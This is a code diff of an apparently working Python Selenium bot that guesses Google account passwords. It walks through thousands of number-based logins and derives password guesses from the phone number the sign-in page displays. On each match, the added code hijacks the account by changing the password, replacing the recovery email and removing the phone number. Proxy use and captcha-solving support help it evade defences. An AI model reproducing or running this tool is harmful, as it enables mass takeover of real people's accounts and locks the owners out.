@@ -1,22 +1,25 @@
 # from pynput.mouse import Button, Controller
 import os
 from selenium.webdriver.common.keys import Keys
-from ps_lib.imap import imap
-from ps_lib.ps_str import ps_str
-from ps_lib.captcha import capcha
 from ps_lib.post import post
 from ps_lib.ps_setup import table
 from ps_lib.helper import helper
 from ps_lib.accounts import accounts
 from ps_lib.uc import ucbrowser
-from ps_lib.browser import browser
 from datetime import datetime
-from pyvirtualdisplay import Display
 from os import path
 import sys
 import shutil
 import random
 import time
+# import subprocess
+# subprocess.call(["python", "-m", 'pip', "install", "requests"])
+# subprocess.call(["python", "-m", 'pip', "install", "imapclient"])
+# subprocess.call(["python", "-m", 'pip', "install", "python_anticaptcha"])
+# subprocess.call(["python", "-m", 'pip', "install", "chardet"])
+# subprocess.call(["python", "-m", 'pip', "install", "pyvirtualdisplay"])
+
+# from pyvirtualdisplay import Display
 
 abspath = os.path.abspath(__file__)
 dname = os.path.dirname(abspath)
@@ -25,71 +28,12 @@ bundle_dir = path.abspath(path.dirname(__file__))
 os.path.dirname(os.path.abspath(__file__))
 
 
-
-def numbercheck(number):
-    pass
-
-
-def passcheck(number):
-    for i in range(1, 3):
-
-        if 'challenge/pwd' in b.current_url():
-
-            try:
-                password = b.visibil_element(
-                    'xpath', '//input[@name="Passwd"]', wait=120)
-                mailpass = b.visibil_element(
-                    'xpath', '//div[@data-profile-identifier]', wait=120)
-                trypass = mailpass.text
-                print('try pass', trypass)
-
-                if trypass.startswith('0'):
-                    trypass = trypass[1:]
-                mailpass = ''.join(e for e in trypass if e.isalnum())
-
-                print('check pass', mailpass)
-                password.clear()
-                password.send_keys(mailpass)
-                # time.sleep(5)
-
-                passwordNext = b.visibil_element(
-                    'css', '[id="passwordNext"] button')
-
-                passwordNext.click()
-
-                time.sleep(1)
-
-                if b.visibil_element('xpath', '//*[@width="16px"][@height="16px"]', wait=10):
-                    worker_acc.save_account(
-                        data=mailpass, soft_token=account_data['password'])
-                    print('not match: {0}'.format(mailpass))
-                    passtype = 1
-
-                    b.get_url(loginurl)
-                    continue
-                else:
-                    print('match: {0}'.format(mailpass))
-
-                    worker_acc.save_account(
-                        data="password: "+mailpass, soft_token=account_data['password'])
-                    worker_acc.update_account(
-                        data=str(no), id=account_data['id'])
-                    b.driver.delete_all_cookies()
-                    b.get_url(loginurl)
-                    continue
-            except:
-
-                print('passwordNext')
-                b.get_url(loginurl)
-                continue
-
-
-def main(account_data, postinfo, packages_id, body_mail):
+def main(account_data):
     # work start time
     starttime = datetime.now().strftime("%H:%M:%S")
 
     print(datetime.now().strftime("%H:%M:%S"))
-    # print(account_data)
+    print(account_data)
     account_id = account_data['id']
     worker_acc = accounts()
     use_proxy = True
@@ -97,6 +41,7 @@ def main(account_data, postinfo, packages_id, body_mail):
     # b = browser(account_id, pva=account_data)
     # b = firefoxBrowser(account_id, pva=account_data)
     b = ucbrowser(account_id, pva=account_data)
+    time.sleep(5)
 
     # if b.PROXY_PASS == False and b.use_proxy == True:
     #     b.exit()
@@ -113,10 +58,12 @@ def main(account_data, postinfo, packages_id, body_mail):
     except:
         b.exit()
     # time.sleep(120)
+
     count = 0
 
     for no in range(int(account_data['extra']), int(account_data['extra'])+5000):
-        time.sleep(2)
+        time.sleep(1)
+        finalacc = None
 
         # rejeted
         # https://accounts.google.com/signin/v2/deniedsigninrejected
@@ -137,23 +84,24 @@ def main(account_data, postinfo, packages_id, body_mail):
 
         continueyes = False
         print('no:', str(no))
-        b.get_screenshot(str(no)+'.png')
+        # b.get_screenshot(str(no)+'.png')
 
         for passwordtype in [3, 2, 1]:
             if 'challenge/pwd' in b.current_url():
                 mailpass = str(no)
-                
 
                 try:
                     password = b.visibil_element(
                         'xpath', '//input[@name="Passwd"]', wait=120)
-                    mailpass1 = b.visibil_element(
+                    mailpass = b.visibil_element(
                         'xpath', '//div[@data-profile-identifier]', wait=120)
-                    trypass =   mailpass.text.replace("-", "")#mailpass
-                    b.get_screenshot(str(trypass)+'-type-'+str(passwordtype)+'.png')
+                    trypass = mailpass.text.replace("-", "")  # mailpass
+                    savenumber = ''.join(e for e in trypass if e.isalnum())
+                    # b.get_screenshot(str(trypass)+'-type-'+str(passwordtype)+'.png')
 
-                    # if trypass.startswith('0'):
-                    #     trypass = trypass[1:]
+                    if trypass.startswith('0'):
+                        if account_data['post_data'] == 'yes':
+                            trypass = trypass[1:]
                     mailpass = ''.join(e for e in trypass if e.isalnum())
                     if passwordtype == 1:
                         mailpass = mailpass
@@ -161,7 +109,7 @@ def main(account_data, postinfo, packages_id, body_mail):
                         mailpass = mailpass[2:]
                     if passwordtype == 3:
                         mailpass = mailpass[:-2]
-                    print('try : ', mailpass)
+                    print('try : ', trypass, mailpass)
                     # try:
                     #     imgcapch = b.visibil_element(
                     #         'id', "captchaimg", wait=1)
@@ -184,7 +132,7 @@ def main(account_data, postinfo, packages_id, body_mail):
                     passwordNext.click()
                     # print(b.driver.requests)
                     # print(datetime.now())
-                    time.sleep(5)
+                    time.sleep(2)
                     # print(datetime.now())
 
                     # if b.visibil_element('xpath', '//*[@width="16px"][@height="16px"]', wait=10):
@@ -197,22 +145,71 @@ def main(account_data, postinfo, packages_id, body_mail):
 
                     else:
                         print('match: {0}'.format(mailpass))
-                        b.get_screenshot(str(mailpass)+'-match-type-'+str(passwordtype)+'.png')
-                        fullnumber = account_data['email']+str(no)
-                        worker_acc.save_account(password=mailpass,
-                                                data=fullnumber, soft_token=account_data['password'])
+                        # b.get_screenshot(str(mailpass)+'-match-type-'+str(passwordtype)+'.png')
+                        fullnumber = account_data['email']+str(savenumber)
+                        finalacc = worker_acc.save_account(password=mailpass,
+                                                           data=fullnumber, soft_token=account_data['password'])
                         worker_acc.update_account(
                             data=str(no), id=account_data['id'])
-                        b.driver.delete_all_cookies()
-                        b.get_url(loginurl)
+                        print('..........start full varsision work.............')
+                        print('final acc ', finalacc)
+                        all = finalacc
+
+                        id = finalacc['id']
+                        email_address = finalacc['email']
+                        email_address = str(email_address)
+                        email_pass = finalacc['password']
+                        recovery_email = finalacc['password']
+                        new_pass = b.account.ran_password()
+                        recovery_email_new = b.account.recovery_return(
+                            recovery_email)
+                        send_keys = True
+                        print("number or email: ", email_address)
+                        login_value = b.gmail_login(id)
+                        if login_value == True:
+                            chengePassRq = b.req_change_password(id)
+                            # print('mail_status', login_value)
+                            # bell = visibil_element(
+                            #     driver, 'xpath', ("//img"), 2)
+                            # if bell:
+                            #     gmail_fail_update(5, id)
+                            #     continue
+
+                            b.driver.implicitly_wait(10)
+                            email_address = b.language_cng(id, email_pass)
+                            print('new rec:', recovery_email_new)
+                            b.update_recovery(recovery_email_new, id)
+                            if chengePassRq == False:
+                                b.change_password(new_pass, id)
+                            b.remove_number(id)
+                            b.device_activity()
+
+                            b.find_time(id)
+                            b.activity_login()
+
+                            b.account.gmail_update(id)
+                        else:
+                            print(login_value)
+
+                        try:
+                            # print('not login')
+                            b.driver.delete_all_cookies()
+                            # driver.close()
+                        except Exception as e:
+                            print(e)
+                            pass
+                        print('..........end full varsision work.............')
                         continueyes = True
                         break
-                except:
+                except Exception as e:
+                    print(e)
+                    print(b.current_url())
 
                     print('passwordNext')
                     b.get_url(loginurl)
                     continueyes = True
                     break
+        # password checking work done
         try:
             imgcapch = b.visibil_element(
                 'id', "captchaimg", wait=1)
@@ -317,8 +314,10 @@ acc = accounts()
 # exit()
 post = post()
 if sys.platform not in ['Windows', 'win32', 'cygwin']:
-    display = Display(visible=0, size=(1024, 768))
-    display.start()
+    # display = Display(visible=0, size=(1024, 768))
+    pass
+    # display.start()
+    pass
 # x = threading.Thread(target=smtp.reply_check, args=(1,), daemon=True)
 # x.start()
 while True:
@@ -346,5 +345,5 @@ while True:
         shutil.rmtree('profiles/' + str(one_account['id']))
 
     print('main')
-    main(one_account, post, packages_id, body_mail)
+    main(one_account)
     time.sleep(1)
